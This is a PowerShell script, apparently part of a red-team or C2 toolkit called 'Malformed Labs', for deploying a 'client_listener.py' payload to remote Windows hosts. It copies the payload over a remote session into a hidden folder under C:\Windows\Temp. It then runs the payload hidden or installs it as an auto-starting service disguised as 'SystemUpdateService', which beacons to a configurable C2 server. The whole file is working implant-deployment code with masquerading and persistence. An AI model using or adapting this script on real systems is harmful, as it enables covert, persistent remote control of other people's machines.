# Malformed Labs Client Deployment Script (Windows)
# Deploys the client listener payload to Windows hosts

param(
    [Parameter(Mandatory=$true)]
    [string]$TargetHost,
    
    [string]$Username = $env:USERNAME,
    [string]$C2Host = "localhost",
    [int]$C2Port = 8888,
    [string]$InstallDir = "C:\Windows\Temp\.malformed",
    [switch]$AsService,
    [switch]$Remove,
    [switch]$List
)

# Colors for output
function Write-Status {
    param([string]$Message)
    Write-Host "[*] $Message" -ForegroundColor Blue
}

function Write-Success {
    param([string]$Message)
    Write-Host "[+] $Message" -ForegroundColor Green
}

function Write-Warning {
    param([string]$Message)
    Write-Host "[!] $Message" -ForegroundColor Yellow
}

function Write-Error {
    param([string]$Message)
    Write-Host "[-] $Message" -ForegroundColor Red
}

function Show-Usage {
    Write-Host "Malformed Labs Client Deployment Script (Windows)"
    Write-Host "Usage: .\deploy.ps1 -TargetHost <HOST> [OPTIONS]"
    Write-Host ""
    Write-Host "Parameters:"
    Write-Host "  -TargetHost <HOST>     Target Windows host"
    Write-Host "  -Username <USER>       Username for remote connection"
    Write-Host "  -C2Host <HOST>         C2 server host (default: localhost)"
    Write-Host "  -C2Port <PORT>         C2 server port (default: 8888)"
    Write-Host "  -InstallDir <DIR>      Installation directory"
    Write-Host "  -AsService             Install as Windows service"
    Write-Host "  -Remove                Remove payload from target"
    Write-Host "  -List                  List active payloads"
    Write-Host ""
    Write-Host "Examples:"
    Write-Host "  .\deploy.ps1 -TargetHost 192.168.1.100"
    Write-Host "  .\deploy.ps1 -TargetHost server.domain.com -AsService"
}

function Test-RemoteConnectivity {
    param([string]$Host)
    
    Write-Status "Testing connectivity to $Host"
    
    try {
        $result = Test-NetConnection -ComputerName $Host -Port 445 -WarningAction SilentlyContinue
        if ($result.TcpTestSucceeded) {
            Write-Success "SMB connection successful"
            return $true
        } else {
            Write-Error "SMB connection failed"
            return $false
        }
    } catch {
        Write-Error "Connection test failed: $($_.Exception.Message)"
        return $false
    }
}

function Deploy-Payload {
    Write-Status "Deploying payload to $TargetHost"
    
    try {
        # Create PSSession
        $session = New-PSSession -ComputerName $TargetHost -Credential (Get-Credential $Username)
        
        # Create installation directory
        Write-Status "Creating installation directory"
        Invoke-Command -Session $session -ScriptBlock {
            param($dir)
            if (!(Test-Path $dir)) {
                New-Item -ItemType Directory -Path $dir -Force | Out-Null
            }
        } -ArgumentList $InstallDir
        
        # Copy payload file
        Write-Status "Uploading payload"
        $payloadPath = Join-Path $InstallDir "client_listener.py"
        Copy-Item -Path "client_listener.py" -Destination $payloadPath -ToSession $session
        
        if ($AsService) {
            Write-Status "Installing as Windows service"
            
            # Create service wrapper script
            $serviceScript = @"
import sys
import os
import subprocess
import time
import logging

# Setup logging
logging.basicConfig(
    filename=r'$InstallDir\service.log',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

def main():
    try:
        logging.info("Starting Malformed Labs Client Service")
        
        # Path to the client listener
        client_path = r'$InstallDir\client_listener.py'
        
        # Start the client listener
        cmd = [sys.executable, client_path, '$C2Host', '$C2Port']
        
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            cwd=r'$InstallDir'
        )
        
        logging.info(f"Client listener started with PID: {process.pid}")
        
        # Wait for process to complete
        process.wait()
        
    except Exception as e:
        logging.error(f"Service error: {e}")
        time.sleep(30)  # Wait before restart

if __name__ == "__main__":
    main()
"@

            # Upload service script
            $serviceScriptPath = Join-Path $InstallDir "service_wrapper.py"
            $serviceScript | Out-File -FilePath $serviceScriptPath -Encoding UTF8
            Copy-Item -Path $serviceScriptPath -ToSession $session
            
            # Install service using NSSM or sc.exe
            Invoke-Command -Session $session -ScriptBlock {
                param($dir, $c2host, $c2port)
                
                $serviceName = "SystemUpdateService"
                $pythonPath = (Get-Command python -ErrorAction SilentlyContinue).Source
                
                if (!$pythonPath) {
                    $pythonPath = "python"
                }
                
                $serviceCmd = "`"$pythonPath`" `"$dir\service_wrapper.py`""
                
                # Create service
                sc.exe create $serviceName binpath= $serviceCmd start= auto
                sc.exe description $serviceName "System Update Background Service"
                sc.exe start $serviceName
                
                Write-Output "Service installed and started"
                
            } -ArgumentList $InstallDir, $C2Host, $C2Port
            
            Write-Success "Payload installed as Windows service"
            
        } else {
            Write-Status "Starting payload in background"
            
            Invoke-Command -Session $session -ScriptBlock {
                param($dir, $c2host, $c2port)
                
                $pythonPath = (Get-Command python -ErrorAction SilentlyContinue).Source
                if (!$pythonPath) {
                    $pythonPath = "python"
                }
                
                # Start in background
                Start-Process -FilePath $pythonPath -ArgumentList "$dir\client_listener.py", $c2host, $c2port -WindowStyle Hidden -WorkingDirectory $dir
                
            } -ArgumentList $InstallDir, $C2Host, $C2Port
        }
        
        # Cleanup session
        Remove-PSSession $session
        
        Write-Success "Payload deployed successfully to $TargetHost"
        Write-Status "C2 Server: $C2Host`:$C2Port"
        
    } catch {
        Write-Error "Deployment failed: $($_.Exception.Message)"
    }
}

function Remove-Payload {
    Write-Status "Removing payload from $TargetHost"
    
    try {
        $session = New-PSSession -ComputerName $TargetHost -Credential (Get-Credential $Username)
        
        Invoke-Command -Session $session -ScriptBlock {
            param($dir)
            
            # Stop and remove service if it exists
            $serviceName = "SystemUpdateService"
            
            try {
                sc.exe stop $serviceName
                sc.exe delete $serviceName
                Write-Output "Service removed"
            } catch {
                Write-Output "No service found or error removing service"
            }
            
            # Kill any running Python processes with our payload
            Get-Process | Where-Object { $_.ProcessName -eq "python" } | ForEach-Object {
                try {
                    if ($_.CommandLine -like "*client_listener.py*") {
                        Stop-Process -Id $_.Id -Force
                    }
                } catch {}
            }
            
            # Remove installation directory
            if (Test-Path $dir) {
                Remove-Item -Path $dir -Recurse -Force
                Write-Output "Installation directory removed"
            }
            
        } -ArgumentList $InstallDir
        
        Remove-PSSession $session
        
        Write-Success "Payload removed from $TargetHost"
        
    } catch {
        Write-Error "Removal failed: $($_.Exception.Message)"
    }
}

function Show-ActivePayloads {
    Write-Status "Checking for active payloads..."
    Write-Warning "List functionality requires C2 server API integration"
    Write-Status "Check your C2 server dashboard at http://$C2Host`:8080"
}

# Main execution
function Main {
    Write-Status "Malformed Labs Client Deployment Script (Windows)"
    Write-Status "Target: $TargetHost"
    Write-Status "C2 Server: $C2Host`:$C2Port"
    
    if ($List) {
        Show-ActivePayloads
        return
    }
    
    if ($Remove) {
        if (!(Test-RemoteConnectivity -Host $TargetHost)) {
            return
        }
        Remove-Payload
        return
    }
    
    # Check if payload file exists
    if (!(Test-Path "client_listener.py")) {
        Write-Error "Payload file 'client_listener.py' not found in current directory"
        return
    }
    
    # Test connectivity
    if (!(Test-RemoteConnectivity -Host $TargetHost)) {
        return
    }
    
    # Deploy payload
    Deploy-Payload
    
    Write-Success "Deployment complete!"
    Write-Status "Monitor your C2 server dashboard for the new client connection"
}

# Show help if no parameters
if (!$TargetHost -and !$List) {
    Show-Usage
    return
}

# Run main function
Main